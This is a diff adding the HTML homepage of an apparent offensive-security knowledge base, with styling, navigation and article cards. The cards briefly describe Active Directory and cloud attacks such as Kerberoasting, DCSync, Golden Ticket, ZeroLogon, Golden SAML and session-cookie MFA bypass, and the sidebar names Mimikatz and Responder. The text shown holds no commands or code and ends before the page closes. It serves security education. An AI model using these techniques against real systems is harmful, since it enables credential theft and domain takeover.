@@ -1,0 +1,2884 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HACKHERWAY // Docs & Blog</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js"></script>
+    <script>
+        pdfjsLib.GlobalWorkerOptions.workerSrc = 'https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js';
+    </script>
+    <style>
+        :root {
+            --bg: #0a0a0a;
+            --bg-elevated: #111111;
+            --bg-card: #16141F;
+            --bg-hover: #1c1c1c;
+            --bg-code: #1a1a1a;
+            --border: #222222;
+            --border-hover: #2a2a2a;
+            --text-primary: #f0f0f0;
+            --text-secondary: #888888;
+            --text-muted: #2B273F;
+            --pink: #ED68A3;
+            --pink-soft: #ff1a5c;
+            --pink-muted: #cc0033;
+            --pink-glow: rgba(254, 9, 66, 0.15);
+            --radius: 6px;
+            --transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg); color: var(--text-primary); line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+        }
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: var(--bg); }
+        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--pink); }
+
+        .nav {
+            position: fixed; top: 0; left: 0; right: 0; height: 56px;
+            background: rgba(10,10,10,0.85); backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border); z-index: 1000;
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 0 24px;
+        }
+        .nav-brand {
+            display: flex; align-items: center; gap: 10px;
+            font-weight: 800; font-size: 15px; letter-spacing: 0.5px;
+            color: var(--text-primary); text-decoration: none; cursor: pointer;
+        }
+        .nav-brand .brand-dot {
+            width: 8px; height: 8px; background: var(--pink); border-radius: 50%;
+            box-shadow: 0 0 12px var(--pink-glow);
+        }
+        .nav-links { display: flex; gap: 4px; }
+        .nav-link {
+            padding: 6px 14px; border-radius: var(--radius); font-size: 13px;
+            font-weight: 500; color: var(--text-secondary); text-decoration: none;
+            transition: var(--transition); cursor: pointer; white-space: nowrap;
+        }
+        .nav-link:hover, .nav-link.active {
+            color: var(--text-primary); background: var(--bg-hover);
+        }
+        .nav-link.active { color: var(--pink); }
+        .nav-toggle {
+            display: none;
+            background: none; border: none; color: var(--text-primary);
+            font-size: 24px; cursor: pointer; padding: 4px;
+        }
+
+        .container {
+            max-width: 1400px; margin: 0 auto;
+            padding: 80px 24px 40px;
+            display: grid; grid-template-columns: 240px 1fr 240px; gap: 32px;
+        }
+        .container.blog-layout { grid-template-columns: 240px 1fr 240px; }
+
+        .sidebar {
+            position: sticky; top: 80px;
+            height: calc(100vh - 100px); overflow-y: auto; padding-right: 8px;
+        }
+        .sidebar-title {
+            font-size: 11px; font-weight: 700; text-transform: uppercase;
+            letter-spacing: 1.5px; color: var(--text-muted);
+            margin-bottom: 16px; padding-bottom: 8px; border-bottom: 1px solid var(--border);
+        }
+        .sidebar-group { margin-bottom: 24px; }
+        .sidebar-group-title {
+            font-size: 12px; font-weight: 600; color: var(--text-secondary);
+            margin-bottom: 8px; display: flex; align-items: center; gap: 6px;
+            cursor: pointer; user-select: none; padding: 4px 0;
+        }
+        .sidebar-group-title::before {
+            content: ''; width: 0; height: 0;
+            border-left: 4px solid transparent; border-right: 4px solid transparent;
+            border-top: 5px solid var(--text-muted); transition: transform 0.2s;
+        }
+        .sidebar-group.collapsed .sidebar-group-title::before { transform: rotate(-90deg); }
+        .sidebar-group.collapsed .sidebar-items { display: none; }
+        .sidebar-items {
+            list-style: none; padding-left: 12px; border-left: 1px solid var(--border);
+        }
+        .sidebar-item { margin-bottom: 2px; }
+        .sidebar-item a {
+            display: block; padding: 5px 10px; font-size: 13px;
+            color: var(--text-secondary); text-decoration: none;
+            border-radius: var(--radius); transition: var(--transition); line-height: 1.4;
+        }
+        .sidebar-item a:hover {
+            color: var(--text-primary); background: var(--bg-hover);
+        }
+        .sidebar-item a.active {
+            color: var(--pink); background: var(--pink-glow); font-weight: 500;
+        }
+        .sidebar-item a.active::before {
+            content: ''; display: inline-block; width: 3px; height: 3px;
+            background: var(--pink); border-radius: 50%; margin-right: 8px; vertical-align: middle;
+        }
+
+        .main { min-width: 0; }
+
+        .hero { padding: 48px 0 40px; border-bottom: 1px solid var(--border); margin-bottom: 40px; }
+        .hero-label {
+            display: flex; align-items: flex-start; gap: 6px;
+            font-size: 11px; font-weight: 700; text-transform: uppercase;
+            letter-spacing: -0.2px; color: var(--pink);
+            margin-bottom: 16px; font-family: 'JetBrains Mono', monospace;
+            line-height: 1.8; flex-wrap: wrap; max-width: 100%;
+        }
+        .hero-label::before {
+            content: ''; width: 6px; height: 6px;
+            background: var(--pink); border-radius: 50%;
+            box-shadow: 0 0 8px var(--pink-glow);
+            flex-shrink: 0; margin-top: 5px;
+        }
+        .hero-label .char {
+            display: inline; transition: color 0.1s ease;
+        }
+        .hero-label .char.scrambling {
+            color: var(--text-muted);
+            text-shadow: 0 0 4px rgba(254, 9, 66, 0.3);
+        }
+        .hero-label .char.resolved {
+            color: var(--pink);
+            text-shadow: 0 0 6px rgba(254, 9, 66, 0.5);
+        }
+        .hero-label .char.just-resolved {
+            animation: glitchFlash 0.15s ease-out;
+        }
+        .hero-label .cursor {
+            display: inline-block; width: 2px; height: 1.1em;
+            background: var(--pink); margin-left: 2px;
+            animation: cursorBlink 0.8s step-end infinite;
+            vertical-align: text-bottom;
+        }
+        @keyframes cursorBlink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        @keyframes glitchFlash {
+            0% { text-shadow: 0 0 0 transparent; }
+            50% { text-shadow: 0 0 8px var(--pink), 0 0 16px var(--pink); }
+            100% { text-shadow: 0 0 0 transparent; }
+        }
+        .hero h1 { font-size: 42px; font-weight: 800; letter-spacing: -1px; line-height: 1.1; }
+        .hero h1 .highlight { color: var(--pink); }
+        .hero p { font-size: 17px; color: var(--text-secondary); max-width: 600px; line-height: 1.6; margin-top: 16px; }
+
+        .section { margin-bottom: 48px; }
+        .section-header {
+            display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px;
+        }
+        .section-title { font-size: 18px; font-weight: 700; letter-spacing: -0.2px; }
+        .section-meta { font-size: 12px; color: var(--text-muted); font-weight: 500; }
+
+        /* PDF EBOOK CARDS */
+        .pdf-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            gap: 20px;
+            margin-bottom: 48px;
+        }
+        .pdf-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            overflow: hidden;
+            transition: var(--transition);
+            cursor: pointer;
+            position: relative;
+        }
+        .pdf-card::before {
+            content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px;
+            background: var(--pink); opacity: 0; transition: opacity 0.2s; z-index: 2;
+        }
+        .pdf-card:hover {
+            border-color: var(--border-hover); transform: translateY(-2px);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+        }
+        .pdf-card:hover::before { opacity: 1; }
+        .pdf-thumbnail {
+            position: relative; width: 100%; height: 320px;
+            background: var(--bg-elevated);
+            overflow: hidden;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .pdf-thumbnail canvas {
+            width: 100% !important; height: 100% !important;
+            object-fit: contain;
+        }
+        .pdf-thumbnail .pdf-placeholder {
+            display: flex; flex-direction: column; align-items: center; gap: 12px;
+            color: var(--text-muted);
+        }
+        .pdf-thumbnail .pdf-placeholder svg {
+            width: 48px; height: 48px; opacity: 0.4;
+        }
+        .pdf-thumbnail .pdf-placeholder span {
+            font-size: 12px; font-family: 'JetBrains Mono', monospace;
+        }
+        .pdf-thumbnail .pdf-error {
+            display: flex; flex-direction: column; align-items: center; gap: 8px;
+            color: var(--pink-muted); font-size: 12px; text-align: center; padding: 20px;
+        }
+        .pdf-info {
+            padding: 16px;
+            display: flex; flex-direction: column; gap: 8px;
+        }
+        .pdf-info h3 {
+            font-size: 14px; font-weight: 700; color: var(--text-primary);
+            line-height: 1.4; margin: 0;
+        }
+        .pdf-info p {
+            font-size: 12px; color: var(--text-secondary); line-height: 1.5; margin: 0;
+        }
+        .pdf-actions {
+            display: flex; gap: 8px; padding: 0 16px 16px;
+        }
+        .pdf-btn {
+            flex: 1; padding: 8px 12px; border-radius: var(--radius);
+            font-size: 12px; font-weight: 600; font-family: 'Inter', sans-serif;
+            cursor: pointer; transition: var(--transition); border: none;
+            text-align: center; text-decoration: none; display: inline-flex;
+            align-items: center; justify-content: center; gap: 6px;
+        }
+        .pdf-btn-primary {
+            background: var(--pink); color: #fff;
+        }
+        .pdf-btn-primary:hover {
+            background: var(--pink-soft); box-shadow: 0 0 16px var(--pink-glow);
+        }
+        .pdf-btn-secondary {
+            background: var(--bg-hover); color: var(--text-secondary);
+            border: 1px solid var(--border);
+        }
+        .pdf-btn-secondary:hover {
+            background: var(--border-hover); color: var(--text-primary);
+            border-color: var(--pink);
+        }
+
+        .card-grid {
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 16px;
+        }
+        .card {
+            background: var(--bg-card); border: 1px solid var(--border);
+            border-radius: var(--radius); padding: 20px;
+            transition: var(--transition); cursor: pointer; position: relative; overflow: hidden;
+        }
+        .card::before {
+            content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px;
+            background: var(--pink); opacity: 0; transition: opacity 0.2s;
+        }
+        .card:hover {
+            border-color: var(--border-hover); transform: translateY(-2px);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+        }
+        .card:hover::before { opacity: 1; }
+        .card-tags { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 12px; }
+        .card-tag {
+            display: inline-block; font-size: 10px; font-weight: 700;
+            text-transform: uppercase; letter-spacing: 1px; color: var(--pink);
+            background: var(--pink-glow); padding: 3px 8px; border-radius: 3px;
+        }
+        .card h3 { font-size: 15px; font-weight: 700; margin-bottom: 8px; line-height: 1.4; }
+        .card p {
+            font-size: 13px; color: var(--text-secondary); line-height: 1.5; margin-bottom: 16px;
+        }
+        .card-footer {
+            display: flex; align-items: center; justify-content: space-between;
+            font-size: 12px; color: var(--text-muted);
+        }
+
+        .blog-post { max-width: 720px; }
+        .blog-header {
+            margin-bottom: 40px; padding-bottom: 32px; border-bottom: 1px solid var(--border);
+        }
+        .blog-tags { display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; }
+        .blog-tag {
+            font-size: 11px; font-weight: 700; text-transform: uppercase;
+            letter-spacing: 1px; color: var(--pink); background: var(--pink-glow);
+            padding: 4px 10px; border-radius: 3px;
+        }
+        .blog-title { font-size: 36px; font-weight: 800; line-height: 1.2; letter-spacing: -0.5px; margin-bottom: 20px; }
+        .blog-meta {
+            display: flex; align-items: center; gap: 16px;
+            font-size: 13px; color: var(--text-muted);
+        }
+        .blog-meta .author { display: flex; align-items: center; gap: 8px; }
+        .author-avatar {
+            width: 28px; height: 28px; border-radius: 50%; background: var(--pink);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 12px; font-weight: 700; color: white;
+        }
+        .blog-content {
+            font-size: 15px; line-height: 1.75; color: var(--text-primary);
+        }
+        .blog-content h2 {
+            font-size: 24px; font-weight: 700; margin-top: 48px; margin-bottom: 20px;
+            padding-bottom: 12px; border-bottom: 1px solid var(--border); scroll-margin-top: 80px;
+        }
+        .blog-content h3 {
+            font-size: 19px; font-weight: 700; margin-top: 32px; margin-bottom: 16px;
+            color: var(--text-primary); scroll-margin-top: 80px;
+        }
+        .blog-content p { margin-bottom: 20px; color: var(--text-secondary); }
+        .blog-content p strong { color: var(--text-primary); font-weight: 600; }
+        .blog-content ul, .blog-content ol {
+            margin-bottom: 20px; padding-left: 24px; color: var(--text-secondary);
+        }
+        .blog-content li { margin-bottom: 8px; }
+        .blog-content li::marker { color: var(--pink); }
+        .blog-content code {
+            font-family: 'JetBrains Mono', monospace; font-size: 13px;
+            background: var(--bg-code); padding: 2px 6px; border-radius: 3px;
+            color: var(--pink-soft); border: 1px solid var(--border);
+        }
+        .blog-content pre {
+            background: var(--bg-code); border: 1px solid var(--border);
+            border-radius: var(--radius); padding: 20px; overflow-x: auto; margin-bottom: 20px;
+        }
+        .blog-content pre code {
+            background: none; border: none; padding: 0;
+            color: var(--text-primary); font-size: 13px; line-height: 1.6;
+        }
+        .blog-content blockquote {
+            border-left: 3px solid var(--pink); padding-left: 20px;
+            margin: 24px 0; color: var(--text-secondary); font-style: italic;
+        }
+        .blog-content a {
+            color: var(--pink); text-decoration: none;
+            border-bottom: 1px solid transparent; transition: var(--transition);
+        }
+        .blog-content a:hover { border-bottom-color: var(--pink); }
+        .blog-content img {
+            max-width: 100%; border-radius: var(--radius);
+            border: 1px solid var(--border); margin: 24px 0;
+        }
+        .toc-sidebar .sidebar-item a { font-size: 12px; }
+        .toc-sidebar .sidebar-item.level-2 a { padding-left: 16px; font-size: 11px; }
+
+        .footer {
+            margin-top: 64px; padding-top: 32px; border-top: 1px solid var(--border);
+            text-align: center; font-size: 12px; color: var(--text-muted);
+        }
+        .footer a { color: var(--text-secondary); text-decoration: none; transition: var(--transition); }
+        .footer a:hover { color: var(--pink); }
+
+        .mobile-nav-overlay {
+            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7);
+            z-index: 999; backdrop-filter: blur(4px);
+        }
+        .mobile-nav-overlay.active { display: block; }
+        .mobile-nav-drawer {
+            position: fixed; top: 0; right: -280px; width: 280px; height: 100vh;
+            background: var(--bg-elevated); border-left: 1px solid var(--border);
+            z-index: 1001; transition: right 0.3s ease;
+            padding: 80px 24px 24px; overflow-y: auto;
+        }
+        .mobile-nav-drawer.active { right: 0; }
+        .mobile-nav-drawer .nav-link {
+            display: block; padding: 12px 16px; margin-bottom: 4px;
+            font-size: 14px; border-radius: var(--radius);
+        }
+        .mobile-nav-drawer .mobile-nav-close {
+            position: absolute; top: 16px; right: 16px;
+            background: none; border: none; color: var(--text-secondary);
+            font-size: 24px; cursor: pointer;
+        }
+
+        @media (max-width: 1100px) {
+            .container, .container.blog-layout {
+                grid-template-columns: 200px 1fr 200px;
+                gap: 24px;
+            }
+        }
+
+        @media (max-width: 900px) {
+            .container, .container.blog-layout {
+                grid-template-columns: 1fr;
+                gap: 24px;
+                padding: 72px 20px 40px;
+            }
+            .sidebar {
+                position: relative; top: 0; height: auto;
+                order: 2; padding-right: 0;
+            }
+            .main { order: 1; min-width: 0; }
+            .hero { padding: 32px 0 32px; }
+            .hero h1 { font-size: 32px; }
+            .blog-title { font-size: 26px; }
+            .nav-links { display: none; }
+            .nav-toggle { display: block; }
+            .pdf-grid { grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); }
+        }
+
+        @media (max-width: 600px) {
+            .container, .container.blog-layout { padding: 72px 16px 40px; }
+            .hero h1 { font-size: 26px; }
+            .hero p { font-size: 15px; }
+            .section-title { font-size: 16px; }
+            .blog-title { font-size: 22px; }
+            .card-grid { grid-template-columns: 1fr; }
+            .pdf-grid { grid-template-columns: 1fr; }
+            .pdf-thumbnail { height: 400px; }
+            .nav { padding: 0 16px; }
+            .nav-brand { font-size: 14px; }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .fade-in { animation: fadeIn 0.4s ease-out forwards; }
+        .hidden { display: none !important; }
+    </style>
+    <base target="_blank">
+</head>
+<body>
+    <nav class="nav">
+        <a class="nav-brand" onclick="showPage('home')">
+            <span class="brand-dot"></span>
+            HACKHERWAY
+        </a>
+        <div class="nav-links">
+            <a class="nav-link active" data-page="home" onclick="showPage('home')">Docs</a>
+            <a class="nav-link" data-page="blog" onclick="showPage('blog')">Blog</a>
+            <a class="nav-link" data-page="privesc" onclick="showPage('privesc')">PrivEsc</a>
+            <a class="nav-link" data-page="linuxprivesc" onclick="showPage('linuxprivesc')">Linux</a>
+            <a class="nav-link" data-page="network" onclick="showPage('network')">Network</a>
+            <a class="nav-link" data-page="web" onclick="showPage('web')">Web</a>
+            <a class="nav-link" data-page="osint" onclick="showPage('osint')">OSINT</a>
+            <a class="nav-link" href="https://github.com/hackherway" target="_blank">GitHub</a>
+        </div>
+        <button class="nav-toggle" onclick="toggleMobileNav()">&#9776;</button>
+    </nav>
+
+    <div class="mobile-nav-overlay" id="mobileNavOverlay" onclick="toggleMobileNav()"></div>
+    <div class="mobile-nav-drawer" id="mobileNavDrawer">
+        <button class="mobile-nav-close" onclick="toggleMobileNav()">&times;</button>
+        <a class="nav-link active" data-page="home" onclick="showPage('home'); toggleMobileNav()">Docs</a>
+        <a class="nav-link" data-page="blog" onclick="showPage('blog'); toggleMobileNav()">Blog</a>
+        <a class="nav-link" data-page="privesc" onclick="showPage('privesc'); toggleMobileNav()">PrivEsc</a>
+        <a class="nav-link" data-page="linuxprivesc" onclick="showPage('linuxprivesc'); toggleMobileNav()">Linux</a>
+        <a class="nav-link" data-page="network" onclick="showPage('network'); toggleMobileNav()">Network</a>
+        <a class="nav-link" data-page="web" onclick="showPage('web'); toggleMobileNav()">Web</a>
+        <a class="nav-link" data-page="osint" onclick="showPage('osint'); toggleMobileNav()">OSINT</a>
+        <a class="nav-link" href="https://github.com/hackherway" target="_blank">GitHub</a>
+    </div>
+
+    <!-- ========== HOMEPAGE ========== -->
+    <div id="page-home" class="page">
+        <div class="container">
+            <aside class="sidebar left-sidebar">
+                <div class="sidebar-title">Categories</div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Active Directory</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#" class="active">Enumeration</a></li>
+                        <li class="sidebar-item"><a href="#">Kerberos Attacks</a></li>
+                        <li class="sidebar-item"><a href="#">LDAP & DNS</a></li>
+                        <li class="sidebar-item"><a href="#">Privilege Escalation</a></li>
+                        <li class="sidebar-item"><a href="#">Lateral Movement</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Network Security</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">ARP Spoofing</a></li>
+                        <li class="sidebar-item"><a href="#">DHCP Starvation</a></li>
+                        <li class="sidebar-item"><a href="#">DNS Exfiltration</a></li>
+                        <li class="sidebar-item"><a href="#">Wireless Attacks</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Offensive Tools</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">BloodHound</a></li>
+                        <li class="sidebar-item"><a href="#">Impacket</a></li>
+                        <li class="sidebar-item"><a href="#">CrackMapExec</a></li>
+                        <li class="sidebar-item"><a href="#">Responder</a></li>
+                        <li class="sidebar-item"><a href="#">Mimikatz</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Methodology</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">Reconnaissance</a></li>
+                        <li class="sidebar-item"><a href="#">Threat Hunting</a></li>
+                        <li class="sidebar-item"><a href="#">Red Team Ops</a></li>
+                        <li class="sidebar-item"><a href="#">Purple Teaming</a></li>
+                    </ul>
+                </div>
+            </aside>
+
+            <main class="main">
+                <div class="hero">
+                    <div class="hero-label" id="heroLabel"></div>
+                    <h1>Offensive Security <span class="highlight">Knowledge Base</span></h1>
+                    <p>Curated guides, cheatsheets, and deep dives for ethical hackers and security professionals.</p>
+                </div>
+
+                <!-- PDF EBOOK LIBRARY -->
+                <section class="section">
+                    <div class="section-header">
+                        <h2 class="section-title">Ebook Library</h2>
+                        <span class="section-meta">PDF guides & references</span>
+                    </div>
+                    <div class="pdf-grid" id="pdfGrid">
+                        <!-- PDF cards rendered by JS -->
+                    </div>
+                </section>
+
+                <section class="section">
+                    <div class="section-header">
+                        <h2 class="section-title">Attack Catalog</h2>
+                        <span class="section-meta">11010010 articles</span>
+                    </div>
+                    <div class="card-grid">
+                        <div class="card" onclick="showPage('blog')">
+                            <div class="card-tags">
+                                <span class="card-tag">Active Directory</span>
+                                <span class="card-tag">Credential Theft</span>
+                                <span class="card-tag">Kerberos</span>
+                                <span class="card-tag">Identity Security</span>
+                            </div>
+                            <h3>Did Someone Say Roast? AS-REP Roasting and How to Stop It Before You Get Burned</h3>
+                            <p>You don't need privileges to steal credentials. Discover how attackers abuse pre-authentication settings to target weak user accounts, crack hashes offline, and burn down your domain security.</p>
+                            <div class="card-footer">
+                                <span class="date">May 10, 2026</span>
+                                <span class="read-time">23 min read</span>
+                            </div>
+                        </div>
+                        <div class="card" onclick="showPage('privesc')">
+                            <div class="card-tags">
+                                <span class="card-tag">Active Directory</span>
+                                <span class="card-tag">Credential Theft</span>
+                                <span class="card-tag">Kerberos</span>
+                                <span class="card-tag">Privilege Escalation</span>
+                            </div>
+                            <h3>Forging the Crown Jewels: Inside the Golden Ticket Active Directory Attack</h3>
+                            <p>Total domain dominance achieved. See how compromising the Kerberos Ticket Granting Service account allows attackers to issue infinite access passes to any system, forever. Really... Forever.</p>
+                            <div class="card-footer">
+                                <span class="date">May 15, 2026</span>
+                                <span class="read-time">18 min read</span>
+                            </div>
+                        </div>
+                        <div class="card" onclick="showPage('kerberoasting')">
+                            <div class="card-tags">
+                                <span class="card-tag">Active Directory</span>
+                                <span class="card-tag">Credential Theft</span>
+                                <span class="card-tag">Kerberos</span>
+                                <span class="card-tag">Kerberoasting</span>
+                            </div>
+                            <h3>Roasting Kerberos: Exploiting Service Principal Names (SPNs) for Fun and Profit</h3>
+                            <p>Service accounts often hold high privileges and weak passwords. Find out how anyone on the domain can safely request service tickets to brute-force account credentials off your network.</p>
+                            <div class="card-footer">
+                                <span class="date">May 18, 2026</span>
+                                <span class="read-time">16 min read</span>
+                            </div>
+                        </div>
+                        <div class="card" onclick="showPage('adminsdholder')">
+                            <div class="card-tags">
+                                <span class="card-tag">Active Directory</span>
+                                <span class="card-tag">Persistence</span>
+                                <span class="card-tag">Privilege Escalation</span>
+                                <span class="card-tag">Threat Hunting</span>
+                            </div>
+                            <h3>Permanent Access: Hunting for AdminSDHolder Persistence in Active Directory</h3>
+                            <p>Every 60 minutes, Active Directory resets protected object permissions. Learn how clever attackers modify this template to establish unshakeable persistence across a network.</p>
+                            <div class="card-footer">
+                                <span class="date">May 20, 2026</span>
+                                <span class="read-time">14 min read</span>
+                            </div>
+                        </div>
+                        <div class="card" onclick="showPage('lotl')">
+                            <div class="card-tags">
+                                <span class="card-tag">Active Directory</span>
+                                <span class="card-tag">Living Off The Land</span>
+                                <span class="card-tag">Credential Theft</span>
+                                <span class="card-tag">Incident Response</span>
+                            </div>
+                            <h3>Mimicking the DC: Defending Against DCSync and Living Off The Land (LoTL) Attacks</h3>
+                            <p>Attacker's don't always need malware; sometimes they just request a replication. Learn how adversaries abuse legitimate Active Directory API calls to extract password hashes directly from domain controllers.</p>
+                            <div class="card-footer">
+                                <span class="date">May 22, 2026</span>
+                                <span class="read-time">20 min read</span>
+                            </div>
+                        </div>
+                        <div class="card" onclick="showPage('total-domain-takeover')">
+                            <div class="card-tags">
+                                <span class="card-tag">ACTIVE DIRECTORY</span>
+                                <span class="card-tag">ATTACK CHAINING</span>
+                                <span class="card-tag">LATERAL MOVEMENT</span>
+                                <span class="card-tag">CREDENTIAL THEFT</span>
+                            </div>
+                            <h3>The AD Nightmare: Turning Kerberoasting and DCSync Into a Total Domain Takeover</h3>
+                            <p>Attack chains turn small vulnerabilities into catastrophic breaches. Follow the step-by-step path from service account exploitation straight to entire enterprise domain replication.</p>
+                            <div class="card-footer">
+                                <span class="date">May 25, 2026</span>
+                                <span class="read-time">15 min read</span>
+                            </div>
+                        </div>
+                        <div class="card" onclick="showPage('ntds')">
+                            <div class="card-tags">
+                                <span class="card-tag">Active Directory</span>
+                                <span class="card-tag">Data Exfil</span>
+                                <span class="card-tag">Credential Theft</span>
+                                <span class="card-tag">Volatility</span>
+                            </div>
+                            <h3>Stealing From The Vault: How Attackers Extract the NTDS.dit Database</h3>
+                            <p>The entire Active Directory identity store lives inside one database file. Discover the methods malicious actors use to bypass volume shadow copies to duplicate and exfiltrate this file.</p>
+                            <div class="card-footer">
+                                <span class="date">May 25, 2026</span>
+                                <span class="read-time">15 min read</span>
+                            </div>
+                        </div>
+                        <div class="card" onclick="showPage('skeleton-key')">
+                            <div class="card-tags">
+                                <span class="card-tag">Active Directory</span>
+                                <span class="card-tag">In-Memory Attacks</span>
+                                <span class="card-tag">Persistence</span>
+                                <span class="card-tag">Detection Evasion</span>
+                            </div>
+                            <h3>The Skeleton Key: How Malware Bypasses All Active Directory Authentication</h3>
+                            <p>By patching the domain controller authentication processes in memory, attackers can create a master password. Discover how to inspect system processes for this elusive persistence technique.</p>
+                            <div class="card-footer">
+                                <span class="date">May 25, 2026</span>
+                                <span class="read-time">15 min read</span>
+                            </div>
+                        </div>
+                        <div class="card" onclick="showPage('zerologon')">
+                            <div class="card-tags">
+                                <span class="card-tag">Vulnerability Management</span>
+                                <span class="card-tag">Active Directory</span>
+                                <span class="card-tag">Exploit Development</span>
+                                <span class="card-tag">Cryptography</span>
+                            </div>
+                            <h3>ZeroLogon: The Flaw That Lets Outsiders Become Insiders as Domain Admins Instantly</h3>
+                            <p>A cryptographic error in the NETLOGON protocol completely breaks the active security boundary. Review the severe impact of this legendary flaw and how to verify your systems are patched.</p>
+                            <div class="card-footer">
+                                <span class="date">May 25, 2026</span>
+                                <span class="read-time">15 min read</span>
+                            </div>
+                        </div>
+                        <div class="card" onclick="showPage('malware')">
+                            <div class="card-tags">
+                                <span class="card-tag">Active Directory</span>
+                                <span class="card-tag">Ransomware</span>
+                                <span class="card-tag">Endpoint Protection</span>
+                                <span class="card-tag">Disaster Recovery</span>
+                            </div>
+                            <h3>Fortifying the Core: Stopping Malware Before It Claims Active Directory</h3>
+                            <p>Ransomware aims straight for the central identity repository. Learn how to architect perimeter isolation and backup strategies so active malware can never completely freeze your directory.</p>
+                            <div class="card-footer">
+                                <span class="date">May 25, 2026</span>
+                                <span class="read-time">15 min read</span>
+                            </div>
+                        </div>
+                        <div class="card" onclick="showPage('golden-saml')">
+                            <div class="card-tags">
+                                <span class="card-tag">Cloud Security</span>
+                                <span class="card-tag">IAM</span>
+                                <span class="card-tag">Federation</span>
+                                <span class="card-tag">Golden SAML</span>
+                            </div>
+                            <h3>Forging the Cloud Key: The Definitive Guide to Golden SAML Attacks</h3>
+                            <p>Move past Active Directory boundaries straight into your cloud environment. Master the anatomy of identity provider compromise and learn how to detect forged SAML assertion tokens being used in your environment.</p>
+                            <div class="card-footer">
+                                <span class="date">May 25, 2026</span>
+                                <span class="read-time">15 min read</span>
+                            </div>
+                        </div>
+                        <div class="card" onclick="showPage('mfa-bypass')">
+                            <div class="card-tags">
+                                <span class="card-tag">Cloud Security</span>
+                                <span class="card-tag">MFA Bypass</span>
+                                <span class="card-tag">Session Hijacking</span>
+                                <span class="card-tag">Web Security</span>
+                            </div>
+                            <h3>The Cookie Jar Theft: Bypassing Multi-Factor Authentiation Without a Code</h3>
+                            <p>MFA is not bulletproof if web sessions can be hijacked. Examine how attackers steal active session cookies to access corporate cloud apps without ever touching a login page.</p>
+                            <div class="card-footer">
+                                <span class="date">May 25, 2026</span>
+                                <span class="read-time">15 min read</span>
+                            </div>
+                        </div>
+                        <div class="card" onclick="showPage('entra-id')">
+                            <div class="card-tags">
+                                <span class="card-tag">Cloud Security</span>
+                                <span class="card-tag">Entra ID</span>
+                                <span class="card-tag">IAM</span>
+                                <span class="card-tag">Privilege Escalation</span>
+                            </div>
+                            <h3>The Cloud Backdoor: How Attackers Weaponize Entra ID Application Permissions</h3>
+                            <p>Hidden administrative rights in the cloud can lead to silent tenant takeovers. This guide breaks down how over-privileged application registrations expose cloud data stores to risk.</p>
+                            <div class="card-footer">
+                                <span class="date">May 3, 2026</span>
+                                <span class="read-time">12 min read</span>
+                            </div>
+                        </div>
+                        <div class="card" onclick="showPage('password-spray')">
+                            <div class="card-tags">
+                                <span class="card-tag">Identity Security</span>
+                                <span class="card-tag">Brute-Force</span>
+                                <span class="card-tag">MFA</span>
+                                <span class="card-tag">Auditing</span>
+                            </div>
+                            <h3>Low and Slow: Why Password Spraying Attacks Guarantee Success Against Weak Policies</h3>
+                            <p>Brute-force triggers lockouts, but password spraying slips right under the radar. Find out why testing common passwords across entire enterprises remains highly effective - and how to stop it.</p>
+                            <div class="card-footer">
+                                <span class="date">April 28, 2026</span>
+                                <span class="read-time">5 min read</span>
+                            </div>
+                        </div>
+                        <div class="card" onclick="showPage('cred-stuffing')">
+                            <div class="card-tags">
+                                <span class="card-tag">Identity Security</span>
+                                <span class="card-tag">Brute-Force</span>
+                                <span class="card-tag">Web Security</span>
+                                <span class="card-tag">Bot Detection</span>
+                            </div>
+                            <h3>Automating Chaos: The Brutal Efficiency of Credential Stuffing</h3>
+                            <p>Millions of leaked passwords from old breaches hit login portals every day via automated bots. See how modern web applications deploy rate limiting and behavior tracking to stall them.</p>
+                            <div class="card-footer">
+                                <span class="date">April 28, 2026</span>
+                                <span class="read-time">5 min read</span>
+                            </div>
+                        </div>
